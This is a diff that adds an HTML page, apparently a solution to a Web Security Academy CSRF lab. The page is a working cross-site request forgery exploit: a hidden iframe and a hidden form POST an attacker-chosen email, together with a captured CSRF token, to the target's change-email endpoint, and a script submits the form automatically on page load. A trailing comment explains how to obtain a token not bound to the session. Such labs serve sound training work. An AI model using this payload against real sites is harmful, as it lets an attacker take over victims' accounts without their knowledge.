@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <h1>Hello world</h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0a3d00d804f4a3b881f62f1a00410090.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="test5@test.com">
+            <input type="hidden" name="csrf" value="YpbXVfWl93N4X0jrTozPKd6WQogpCHGU">
+        </form>
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html>
+<!-- make sure to log in incognito for the csrf token that is not tied with the current session cookie -->
